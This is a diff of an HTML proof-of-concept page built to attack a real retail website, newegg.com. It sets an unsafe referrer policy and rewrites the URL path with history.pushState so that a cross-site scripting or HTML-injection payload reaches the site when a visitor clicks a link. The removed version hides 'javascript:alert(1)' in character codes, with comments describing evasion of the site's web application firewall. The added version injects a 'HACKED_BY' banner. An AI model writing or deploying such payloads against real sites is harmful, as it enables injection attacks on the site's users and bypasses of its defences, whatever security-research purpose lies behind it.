@@ -3,27 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
-    <title>VORTEX BYPASS v3</title>
+    <title>PoC Mouad</title>
 </head>
 <body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
 
-    <h1 style="color:cyan;">VORTEX ENCODING MODE</h1>
-    
-    <a id="fire" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
-       style="padding:20px; background:cyan; color:black; font-weight:bold; text-decoration:none;">
-        FIRE ENCODED XSS 🚀
+    <h1>Newegg Vulnerability Lab</h1>
+    <a id="attack" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
+       style="padding:20px; background:red; color:white; text-decoration:none; font-weight:bold;">
+        CLICK TO TRIGGER 🚀
     </a>
 
     <script>
-        // سنستخدم تشفير URL مرتين للرموز الخطرة
-        // javascript:alert(1) تصبح غير مرئية للـ WAF
-        var part1 = "javascript";
-        var part2 = String.fromCharCode(58, 97, 108, 101, 114, 116, 40, 49, 41); // :alert(1)
+       
+        var payload = "'><u><h1>HACKED_BY_MOUAD</h1></u>";
         
-        var fullPayload = part1 + part2;
         
-        // التوجيه مع مسار يحتوي على البايلود
-        window.history.pushState({}, '', "/" + encodeURIComponent(fullPayload) + "/v/");
+        var attackPath = "/VORTEX/v/" + payload;
+
+        window.history.pushState({}, '', attackPath);
     </script>
 </body>
 </html>
